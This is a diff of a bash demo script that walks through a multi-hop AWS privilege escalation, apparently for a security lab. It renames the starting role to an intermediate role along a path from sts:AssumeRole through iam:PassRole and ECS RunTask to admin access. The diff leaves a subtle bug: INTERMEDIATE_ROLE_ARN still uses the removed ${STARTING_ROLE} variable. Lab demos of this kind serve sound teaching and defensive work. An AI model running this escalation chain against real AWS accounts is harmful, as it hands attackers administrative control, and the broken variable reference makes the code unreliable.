@@ -38,7 +38,7 @@ show_attack_cmd() {
 
 # Configuration
 STARTING_USER="pl-prod-sts001-ecs002-starting-user"
-STARTING_ROLE="pl-prod-sts001-ecs002-starting-role"
+INTERMEDIATE_ROLE="pl-prod-sts001-ecs002-intermediate-role"
 ADMIN_ROLE="pl-prod-sts001-ecs002-admin-role"
 CLUSTER_NAME="pl-prod-sts001-ecs002-attack-cluster"
 TASK_FAMILY="pl-sts001-ecs002-admin-escalation"
@@ -49,7 +49,7 @@ echo -e "${GREEN}Multi-Hop Privilege Escalation Demo${NC}"
 echo -e "${GREEN}========================================${NC}\n"
 
 echo -e "${BLUE}Attack Path:${NC}"
-echo "starting_user -> (sts:AssumeRole) -> starting_role"
+echo "starting_user -> (sts:AssumeRole) -> intermediate_role"
 echo "             -> (iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask)"
 echo "             -> admin_role (via ECS task) -> admin access"
 echo ""
@@ -173,24 +173,24 @@ else
 fi
 echo ""
 
-# [EXPLOIT] Step 6: HOP 1 - Assume the starting role
-echo -e "${YELLOW}Step 6: HOP 1 - Assuming the starting role with ECS permissions${NC}"
+# [EXPLOIT] Step 6: HOP 1 - Assume the intermediate role
+echo -e "${YELLOW}Step 6: HOP 1 - Assuming the intermediate role with ECS permissions${NC}"
 echo -e "${BLUE}Attack Vector: sts:AssumeRole${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
-STARTING_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${STARTING_ROLE}"
-echo "Target Role: $STARTING_ROLE_ARN"
+INTERMEDIATE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${STARTING_ROLE}"
+echo "Target Role: $INTERMEDIATE_ROLE_ARN"
 echo ""
 
-show_attack_cmd "Attacker" "aws sts assume-role --role-arn $STARTING_ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
-    --role-arn $STARTING_ROLE_ARN \
+    --role-arn $INTERMEDIATE_ROLE_ARN \
     --role-session-name demo-session \
     --query 'Credentials' \
     --output json)
 
 if [ $? -ne 0 ]; then
-    echo -e "${RED}Error: Failed to assume starting role${NC}"
+    echo -e "${RED}Error: Failed to assume intermediate role${NC}"
     exit 1
 fi
 
@@ -207,24 +207,24 @@ export AWS_REGION=$AWS_REGION
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ROLE_IDENTITY"
-echo -e "${GREEN}[OK] Successfully assumed starting role${NC}"
+echo -e "${GREEN}[OK] Successfully assumed intermediate role${NC}"
 echo ""
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}HOP 1 COMPLETE - Now operating as starting role${NC}"
+echo -e "${GREEN}HOP 1 COMPLETE - Now operating as intermediate role${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo ""
 
-# [OBSERVATION] Step 7: Verify the starting role's permissions
-echo -e "${YELLOW}Step 7: Verifying starting role permissions${NC}"
+# [OBSERVATION] Step 7: Verify the intermediate role's permissions
+echo -e "${YELLOW}Step 7: Verifying intermediate role permissions${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
-echo "The starting role should have ECS and PassRole permissions..."
+echo "The intermediate role should have ECS and PassRole permissions..."
 echo "Still cannot list IAM users (not admin yet)..."
 show_cmd "ReadOnly" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${RED}Warning: Starting role can list IAM users${NC}"
+    echo -e "${RED}Warning: Intermediate role can list IAM users${NC}"
 else
-    echo -e "${GREEN}[OK] Starting role cannot list IAM users (expected - limited permissions)${NC}"
+    echo -e "${GREEN}[OK] Intermediate role cannot list IAM users (expected - limited permissions)${NC}"
 fi
 echo ""
 
@@ -497,7 +497,7 @@ echo "1. Started as: $STARTING_USER"
 echo "   (with sts:AssumeRole permission)"
 echo ""
 echo "2. HOP 1: STS AssumeRole"
-echo "   - Assumed role: $STARTING_ROLE"
+echo "   - Assumed role: $INTERMEDIATE_ROLE"
 echo "   - Gained ECS and PassRole permissions"
 echo ""
 echo "3. HOP 2: ECS PassRole Escalation"
@@ -512,7 +512,7 @@ echo -e "  $STARTING_USER"
 echo -e "  |"
 echo -e "  | (sts:AssumeRole)"
 echo -e "  v"
-echo -e "  $STARTING_ROLE [with ECS + PassRole permissions]"
+echo -e "  $INTERMEDIATE_ROLE [with ECS + PassRole permissions]"
 echo -e "  |"
 echo -e "  | (ecs:CreateCluster)"
 echo -e "  v"
@@ -530,8 +530,8 @@ echo -e "  v"
 echo -e "  $STARTING_USER -> ADMIN ACCESS"
 
 echo -e "\n${YELLOW}Why This Works:${NC}"
-echo "- sts:AssumeRole allows the starting user to become the starting role"
-echo "- The starting role has iam:PassRole on the admin role"
+echo "- sts:AssumeRole allows the starting user to become the intermediate role"
+echo "- The intermediate role has iam:PassRole on the admin role"
 echo "- ecs:CreateCluster, ecs:RegisterTaskDefinition, and ecs:RunTask allow running arbitrary code"
 echo "- By passing the admin role to an ECS task, the task runs with admin permissions"
 echo "- The task can then modify IAM policies to grant admin access to the starting user"
